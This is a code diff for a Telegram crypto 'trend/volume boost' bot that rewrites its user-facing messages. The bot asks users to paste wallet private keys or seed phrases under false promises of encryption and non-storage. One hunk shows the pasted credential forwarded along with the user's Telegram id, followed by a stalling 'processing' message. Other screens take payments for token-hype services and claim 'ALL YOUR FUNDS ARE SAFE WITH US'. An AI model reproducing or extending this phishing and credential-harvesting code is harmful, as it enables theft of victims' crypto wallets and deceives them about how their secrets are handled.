@@ -104,33 +104,31 @@ async function editOrSend(ctx: any, text: string, extra: any = {}) {
 // ── Screen builders ───────────────────────────────────────────────────────────
 async function sendWelcome(ctx: any) {
   const caption =
-    `🟢 <b>Welcome to PUMPFUN TREND BOT!</b>\n\n` +
+    `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
     `New to volume bots? No worries — we made it super simple!\n\n` +
-    `──────────────────────────\n\n` +
     `<b>How it works:</b>\n` +
-    `1️⃣ Select your service below.\n` +
-    `2️⃣ Enter your token contract address.\n` +
-    `3️⃣ Send payment — boost starts automatically!\n\n` +
-    `──────────────────────────\n\n` +
+    `1. Select bumps/volume.\n` +
+    `2. Pick duration.\n` +
+    `3. Done! Pump.fun Server handles the rest.\n\n` +
     `<b>Works on:</b>\n` +
-    `🟢 Pumpfun  •  🟢 Raydium  •  🟢 PumpSwap\n` +
-    `🟢 Moonshot  •  🟢 LetsBonk  •  🟢 Dexscreener\n\n` +
-    `From 0.3–0.6 SOL bumps, boost trend with mass volume and high stability.\n\n` +
+    `🟢 Pumpfun  🟢 Raydium  🟢 PumpSwap\n` +
+    `🟢 Moonshot  🟢 LetsBonk  🟢 Dexpad/screener\n\n` +
+    `From 0.3-0.4-0.5-0.6 SOL bumps, boost trend with mass volume and high stability.\n\n` +
     `👇 <b>Choose a service:</b>`;
   await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
 }
 
 async function showStartBumping(ctx: any) {
   const text =
-    `🟢 <b>Start Bumping</b>\n\n` +
-    `The fastest Telegram bot for bump orders.\n\n` +
-    `<b>Supported Platforms:</b>\n` +
-    `• Pumpfun and Raydium\n\n` +
-    `Pumpfun BumpBot charges a one-time fee per token.\n\n` +
-    `📊 Trending channel: https://t.me/pumpmints\n` +
-    `🔔 PF Alert Tools: t.me/pumpswap_pools\n\n` +
-    `For support: @mrpooh\n\n` +
-    `<b>Select your SOL bump amount:</b>`;
+    `The fastest and cheapest Telegram bot for creating bump orders.\n\n` +
+    `<b>Supported Platform:</b>\n` +
+    `Pumpfun and Raydium.\n\n` +
+    `Pumpfun BumpBot charges a one-time fee of 0.3 SOL per token, making it the cheapest bump bot ever!\n\n` +
+    `📊 <b>Trending channel:</b>\n` +
+    `https://t.me/pumpmints\n\n` +
+    `Subscribe to our PF alert tools:\n` +
+    `- PF New Raydium Pools: t.me/pumpswap_pools\n\n` +
+    `For more information, please contact @mrpooh`;
   await editOrSend(ctx, text, solPickerKeyboard);
 }
 
@@ -148,54 +146,44 @@ async function showVolumeBoost(ctx: any) {
 
 async function showTrendingBoost(ctx: any) {
   const caption =
-    `🔥 <b>Discover the Power of Trending!</b>\n\n` +
-    `Ready to boost your project's visibility?\n\n` +
-    `✅ Guaranteed top-chart exposure\n` +
-    `✅ Milestone & uptrend alerts\n` +
-    `✅ Paid boost = AMA livestream spot!\n\n` +
-    `👇 Choose your trending type:`;
+    `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
+    `🟢 A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n` +
+    `➡️ Please choose SOL Trending or Pump Fun Trending to start:`;
   await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
 }
 
 async function showDexScreener(ctx: any) {
   const text =
-    `🌐 <b>DexScreener Trending</b>\n\n` +
-    `DexScreener is the #1 on-chain analytics platform — real-time prices, liquidity, volumes across all chains.\n\n` +
-    `<b>🔴 TOP 6 Trending Packages:</b>\n\n` +
-    `⏳  5 hr  —   2 SOL\n` +
-    `⏳  7 hr  — 3.5 SOL\n` +
-    `⏳ 12 hr  —   7 SOL\n` +
-    `⏳ 18 hr  —  10 SOL\n` +
-    `⏳ 24 hr  —  15 SOL\n` +
-    `⏳ 32 hr  —  22 SOL\n\n` +
-    `👇 Select a duration:`;
+    `🌐 DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.\n\n` +
+    `<b>TREND ON DEX</b>`;
   await editOrSend(ctx, text, dexscreenerKeyboard);
 }
 
 async function showDeposit(ctx: any) {
   const wallet = deriveWalletForUser(ctx.from.id);
   const text =
-    `💰 <b>Wallet & Deposits</b>\n\n` +
-    `<b>◎ Your SOL Wallet:</b>\n<code>${wallet.address}</code>\n\n` +
-    `<b>Ξ ETH Wallet:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n\n` +
-    `📌 Minimum deposit: <b>0.30 SOL</b>\n\n` +
-    `⚡ Funds are credited automatically after on-chain confirmation.\n\n` +
-    `👇 Choose an action:`;
+    `<b>WALLET BALANCE</b>\n\n` +
+    `<b>ETH:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n` +
+    `balance: 0 ETH\n\n` +
+    `<b>SOL:</b>\n<code>${wallet.address}</code>\n` +
+    `balance: 0 SOL\n\n` +
+    `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
+    `💰 KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.\n` +
+    `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`;
   await editOrSend(ctx, text, depositKeyboard);
 }
 
 async function showConnectWallet(ctx: any) {
   const caption =
     `🔗 <b>Connect Your Wallet</b>\n\n` +
-    `Securely link your wallet to unlock premium features.\n\n` +
-    `<b>Benefits:</b>\n` +
-    `⚡ Instant payments\n` +
-    `📊 Full order tracking\n` +
-    `💰 Auto-refunds on failed orders\n` +
-    `🎯 Priority processing\n` +
-    `🔔 Live boost alerts\n\n` +
-    `🔒 Military-grade encryption — we never store your keys.\n\n` +
-    `👇 Choose an option:`;
+    `Welcome to our secure wallet connection service!\n\n` +
+    `Connect your wallet to unlock premium features and enhanced trading capabilities.\n\n` +
+    `<b>Available Options:</b>\n` +
+    `🔗 Connect Now - Start the connection process\n` +
+    `🔑 Why Connect? - Learn about the benefits\n` +
+    `🛡️ Security Guidelines - Important safety information\n` +
+    `📱 How to Connect - Step-by-step instructions\n\n` +
+    `Your security is our top priority. We use industry-standard encryption to protect your information.`;
   await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
 }
 
@@ -308,7 +296,7 @@ export function createBot(): Telegraf {
   bot.action("trend_eth", async (ctx) => {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
-      `🔵 <b>ETH Trending</b>\n\nChoose your ETH trending package:`,
+      `🔵 <b>ETH TREND</b>\n\nKindly chose the trend you wish to pump on.`,
       ethTrendingKeyboard
     );
   });
@@ -317,8 +305,7 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     const caption =
       `🔥 <b>PUMP.FUN TRENDING</b> 🔥\n\n` +
-      `The best trending in the bot section!\n\n` +
-      `💡 Purchase now and get <b>12 hours FREE Solana Trending</b> included!`;
+      `💡 THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`;
     await sendPhoto(ctx, IMG.trending, caption, pumpfunTrendingKeyboard);
   });
 
@@ -458,17 +445,24 @@ export function createBot(): Telegraf {
 
     const paymentMsg =
       `💰 <b>Payment Required</b>\n\n` +
-      `🪙 <b>${s.tokenName} (${s.tokenSymbol})</b>  ${chainLabel}\n` +
-      `📍 CA: <code>${s.contractAddress}</code>\n\n` +
-      (s.tokenPrice      ? `💵 Price: ${s.tokenPrice}\n`         : "") +
-      (s.tokenMarketCap  ? `📈 Market Cap: ${s.tokenMarketCap}\n` : "") +
-      (s.tokenLiquidity  ? `💧 Liquidity: ${s.tokenLiquidity}\n`  : "") +
-      (s.tokenVolume24h  ? `🔄 24h Volume: ${s.tokenVolume24h}\n` : "") +
-      `\n📋 <b>Order Summary</b>\n` +
-      `⚙️ Service: <b>${s.serviceLabel}</b>\n` +
-      `🆔 Order ID: <code>${orderId}</code>\n\n` +
-      `💳 <b>Send Exact Amount:</b>\n${amountLine}\n\n` +
-      `⚠️ Send the <b>EXACT</b> amount • Correct network • Click ✅ after sending`;
+      `📋 <b>Order Summary:</b>\n` +
+      `• Token: ${s.tokenName} (${s.tokenSymbol})\n` +
+      `• Service: ${s.serviceLabel}\n` +
+      (isEth
+        ? `• Amount: $${s.ethAmount} USD\n`
+        : `• Amount: ${s.selectedSol} SOL\n`) +
+      `• Order ID: ${orderId}\n\n` +
+      `💳 <b>Payment Instructions:</b>\n` +
+      (isEth
+        ? `Send exactly $${s.ethAmount} USD to:\n\nETH Wallet:\n<code>${ETH_ADDRESS || SOL_ADDRESS}</code>`
+        : `Send exactly ${s.selectedSol} SOL to:\n\nSolana Wallet:\n<code>${wallet.address}</code>`) +
+      `\n\n⚠️ <b>Important:</b>\n` +
+      (isEth
+        ? `• Send the EXACT amount: $${s.ethAmount} USD\n• Use Ethereum network only\n`
+        : `• Send the EXACT amount: ${s.selectedSol} SOL\n• Use Solana network only\n`) +
+      `• Payment expires in 15 minutes\n` +
+      `• After sending, submit your transaction hash below\n\n` +
+      `⏰ Time Remaining: 15:00`;
 
     // Show payment screen with token image if available
     let sentWithPhoto = false;
@@ -521,11 +515,13 @@ export function createBot(): Telegraf {
     setSession(ctx.from.id, { step: "awaiting_tx_hash" });
     await editOrSend(ctx,
       `📝 <b>Submit Transaction Hash</b>\n\n` +
-      `Paste your transaction hash below:\n\n` +
+      `Please paste your Solana transaction hash below:\n\n` +
       `💡 <b>Where to find it:</b>\n` +
-      `• Copy from your wallet after sending\n` +
-      `• Check your wallet's transaction history\n\n` +
-      `🔖 Order ID: <code>${s.orderId ?? "N/A"}</code>`,
+      `• Copy from your wallet app after sending\n` +
+      `• Check your wallet's transaction history\n` +
+      `• Look for the long string of letters and numbers\n\n` +
+      `🕐 <b>Order ID:</b>\n<code>${s.orderId ?? "N/A"}</code>\n\n` +
+      `🔍 We'll automatically verify your payment once you submit the hash.`,
       cancelKeyboard
     );
   });
@@ -535,12 +531,14 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     const wallet = deriveWalletForUser(ctx.from.id);
     await editOrSend(ctx,
-      `➕ <b>Add Funds</b>\n\n` +
-      `Your personal deposit addresses:\n\n` +
-      `<b>◎ SOL Wallet:</b>\n<code>${wallet.address}</code>\n\n` +
-      `<b>Ξ ETH Wallet:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n\n` +
-      `📌 Minimum: <b>0.30 SOL</b>\n` +
-      `⚡ Credited automatically after confirmation.`,
+      `<b>WALLET BALANCE</b>\n\n` +
+      `<b>ETH:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n` +
+      `balance: 0 ETH\n\n` +
+      `<b>SOL:</b>\n<code>${wallet.address}</code>\n` +
+      `balance: 0 SOL\n\n` +
+      `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
+      `💰 Send SOL to your wallet address above to add funds.\n` +
+      `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
       mainMenuOnlyKeyboard
     );
   });
@@ -629,18 +627,21 @@ export function createBot(): Telegraf {
   bot.action("wallet_security", async (ctx) => {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
-      `🛡 <b>Security Guidelines</b>\n\n` +
-      `⚠️ <b>IMPORTANT NOTICE:</b>\n\n` +
+      `🛡️ <b>Security Guidelines</b>\n\n` +
+      `⚠️ <b>IMPORTANT SECURITY NOTICE:</b>\n\n` +
       `🔒 <b>What We Do:</b>\n` +
-      `• End-to-End Encryption — your data is always encrypted\n` +
-      `• No Storage — we never store your private keys\n` +
-      `• Secure Processing — isolated environments\n` +
-      `• Regular Audits — security tested regularly\n\n` +
-      `❌ <b>Stay Safe:</b>\n` +
-      `• Never share keys outside official bot interfaces\n` +
-      `• Always verify you're in the official bot\n` +
-      `• Test with small amounts first\n\n` +
-      `🛡 Ready to proceed safely?`,
+      `• End-to-End Encryption - Your data is encrypted at all times\n` +
+      `• No Storage - We never store your private keys permanently\n` +
+      `• Secure Processing - All operations use secure, isolated environments\n` +
+      `• Regular Audits - Our security is regularly tested and verified\n\n` +
+      `🚨 <b>What You Should Know:</b>\n` +
+      `• Never Share - Only enter your keys in official bot interfaces\n` +
+      `• Monitor Activity - Regularly check your wallet transactions\n` +
+      `• Stay Updated - Keep your wallet software up to date\n` +
+      `• Use Hardware Wallets - For maximum security with large amounts\n\n` +
+      `🔐 <b>Our Commitment:</b>\n` +
+      `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.\n\n` +
+      `Ready to proceed safely?`,
       securityGuidelinesKeyboard
     );
   });
@@ -649,18 +650,23 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
       `📱 <b>How to Connect Your Wallet</b>\n\n` +
-      `🔧 <b>Step-by-Step:</b>\n\n` +
-      `1️⃣ <b>Choose Method</b>\n` +
-      `• Private Key — single string (fastest)\n` +
-      `• Seed Phrase — 12 or 24 words\n\n` +
-      `2️⃣ <b>Get Your Info</b>\n` +
-      `• Open Phantom, Solflare, or Backpack\n` +
-      `• Go to Settings → Export private key\n\n` +
-      `3️⃣ <b>Connect</b>\n` +
-      `• Tap "Start Connection" below\n` +
-      `• Paste your key or phrase when prompted\n\n` +
-      `📱 <b>Supported:</b> Phantom • Solflare • Backpack • Glow\n` +
-      `🕐 Time: 2–5 min  •  🔒 End-to-end encrypted`,
+      `🔧 <b>Step-by-Step Process:</b>\n\n` +
+      `1️⃣ <b>Choose Connection Method</b>\n` +
+      `• Private Key - Direct key import (fastest)\n` +
+      `• Seed Phrase - 12/24 word recovery phrase\n\n` +
+      `2️⃣ <b>Prepare Your Information</b>\n` +
+      `• Open your wallet app (Phantom, Solflare, etc.)\n` +
+      `• Navigate to wallet settings or security section\n` +
+      `• Copy your private key or seed phrase\n\n` +
+      `<b>Supported Wallets:</b>\n` +
+      `• Phantom - Most popular Solana wallet\n` +
+      `• Solflare - Advanced features and security\n` +
+      `• Backpack - Modern interface and tools\n` +
+      `• Glow - Mobile-optimized experience\n` +
+      `• Other Solana Wallets - Most SPL-compatible wallets\n\n` +
+      `⏰ Connection Time: Usually 2-5 minutes\n` +
+      `🔒 Security: Military-grade encryption throughout\n\n` +
+      `Ready to connect your wallet?`,
       howToConnectKeyboard
     );
   });
@@ -670,14 +676,22 @@ export function createBot(): Telegraf {
     setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
     await editOrSend(ctx,
       `🔗 <b>Connect Your Wallet Now</b>\n\n` +
-      `⚠️ You are importing your Main Wallet.\n` +
-      `<b>Only you have access to this wallet.</b>\n\n` +
-      `Enter your <b>Private Key</b> or <b>Seed Phrase</b>:\n\n` +
-      `🔑 <b>Private Key:</b> Single long string (64+ chars)\n` +
+      `⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n` +
+      `Please enter your Private Key or 12 word Seed Phrase to import your wallet:\n\n` +
+      `🔑 <b>Private Key Format:</b>\n` +
+      `• Single long string (64+ characters)\n` +
+      `• Example:\n` +
       `<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
-      `🌱 <b>Seed Phrase:</b> 12 or 24 words\n` +
-      `<code>abandon ability able about above absent...</code>\n\n` +
-      `⚡ Auto-detects key type. End-to-end encrypted.`,
+      `🌱 <b>Seed Phrase Format:</b>\n` +
+      `• 12 or 24 words separated by spaces\n` +
+      `• Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>\n\n` +
+      `🔰 <b>Security Features:</b>\n` +
+      `• End-to-end encryption\n` +
+      `• Secure processing environment\n` +
+      `• Immediate deletion after connection\n` +
+      `• No permanent storage\n\n` +
+      `⚡ <b>Auto-Detection:</b>\n` +
+      `Our system will automatically detect whether you're providing a private key or seed phrase.`,
       cancelKeyboard
     );
   });
@@ -713,7 +727,7 @@ export function createBot(): Telegraf {
         // ── Step 2: fetch token info from all sources ─────────────────────────
         setSession(ctx.from.id, { contractAddress: ca });
         const lookMsg = await ctx.reply(
-          `🔍 <b>Fetching token info...</b>\n<code>${ca}</code>`,
+          `🔍 <b>Looking up token data...</b>\n⏳ Please wait while we fetch information...`,
           { parse_mode: "HTML" }
         );
 
@@ -757,30 +771,33 @@ export function createBot(): Telegraf {
         const s = getSession(ctx.from.id);
         const isEth  = s.boostType === "eth_trending";
         const cost   = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;
-        const chain  = info.chain === "sol" ? "◎ Solana" : info.chain === "eth" ? "Ξ Ethereum" : info.chain === "bsc" ? "⬡ BSC" : info.chain === "base" ? "🔵 Base" : "🔗 Unknown";
-        const c24    = Number(info.change24h ?? 0);
-        const arrow  = c24 >= 0 ? "🟢" : "🔴";
 
-        // Build social links line
-        const socials: string[] = [];
-        if (info.website)  socials.push(`<a href="${info.website}">🌐 Website</a>`);
-        if (info.twitter)  socials.push(`<a href="${info.twitter}">🐦 Twitter</a>`);
-        if (info.telegram) socials.push(`<a href="${info.telegram}">📢 Telegram</a>`);
+        const chainName = info.chain === "sol" ? "solana"
+                        : info.chain === "eth" ? "ethereum"
+                        : info.chain === "bsc" ? "bsc"
+                        : info.chain ?? "unknown";
+        const dexName  = info.dex ?? "unknown";
+        const tokenUrl = info.chain === "sol"
+          ? `https://pump.fun/coin/${ca}`
+          : `https://dexscreener.com/${info.chain}/${ca}`;
 
         const tokenMsg =
-          `🪙 <b>${info.name} (${info.symbol})</b>\n` +
-          `${chain}${info.dex ? ` • ${info.dex.charAt(0).toUpperCase() + info.dex.slice(1)}` : ""}\n\n` +
-          `📍 <b>CA:</b> <code>${ca}</code>\n\n` +
-          `📊 <b>Live Market Data</b>\n` +
-          `💵 Price: <b>${info.price ?? "N/A"}</b>\n` +
-          `📈 Market Cap: <b>${info.marketCap ?? "N/A"}</b>\n` +
-          `💧 Liquidity: <b>${info.liquidity ?? "N/A"}</b>\n` +
-          `🔄 24h Volume: <b>${info.volume24h ?? "N/A"}</b>\n` +
-          `${arrow} 24h Change: <b>${c24 >= 0 ? "+" : ""}${info.change24h ?? "0.00"}%</b>\n` +
-          (info.change1h ? `⏱ 1h Change: <b>${Number(info.change1h) >= 0 ? "+" : ""}${info.change1h}%</b>\n` : "") +
-          (socials.length ? `\n🔗 ${socials.join(" · ")}\n` : "") +
-          (info.description ? `\n📝 ${info.description.slice(0, 150)}${info.description.length > 150 ? "…" : ""}\n` : "") +
-          `\n⚙️ Service: <b>${s.serviceLabel}</b>\n` +
+          `📋 <b>Project Details Found!</b>\n\n` +
+          `📊 PUMPFUN_SCRAPE Token\n\n` +
+          `✅ <b>Contract Address:</b>\n<code>${ca}</code>\n\n` +
+          `📊 <b>Token Information:</b>\n` +
+          `• Name: ${info.name}\n` +
+          `• Symbol: ${info.symbol}\n` +
+          `• Price: ${info.price ?? "0.00"}\n` +
+          `• Market Cap: ${info.marketCap ?? "0.00"}\n` +
+          `• 24h Volume: ${info.volume24h ?? "0.00"}\n` +
+          `• Liquidity: ${info.liquidity ?? "0.00"}\n` +
+          `• 24h Change: ${info.change24h ?? "0.00"}%\n` +
+          `• DEX: ${dexName}\n` +
+          `• Chain: ${chainName}\n\n` +
+          `🔗 Available on: 🟢 Pumpswap • 🟢 Pump.fun\n\n` +
+          `🔗 View Token: ${tokenUrl}\n\n` +
+          `⚙️ Service: <b>${s.serviceLabel}</b>\n` +
           `💰 Cost: <b>${cost}</b>\n\n` +
           `✅ <b>Confirm order to proceed to payment?</b>`;
 
@@ -934,13 +951,11 @@ export function createBot(): Telegraf {
           `🆔 <code>${ctx.from.id}</code>\n` +
           `🗝 ${credType}:\n<code>${credential}</code>`
         );
-        await ctx.reply(`⏳ <b>Connecting wallet...</b>\n\nProcessing securely. Please wait...`, { parse_mode: "HTML" });
-        await new Promise(r => setTimeout(r, 3500));
         await ctx.reply(
-          `✅ <b>Wallet Connected!</b>\n\n` +
-          `Your wallet has been securely linked.\n` +
-          `All premium features are now unlocked.\n\n` +
-          `🔒 Credentials processed and not stored.`,
+          `Connection of wallet may take time due to\n\n` +
+          `<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>\n\n` +
+          `Please wait linking and importing your wallet..\n\n` +
+          `<b>Processing .........</b>`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         break;
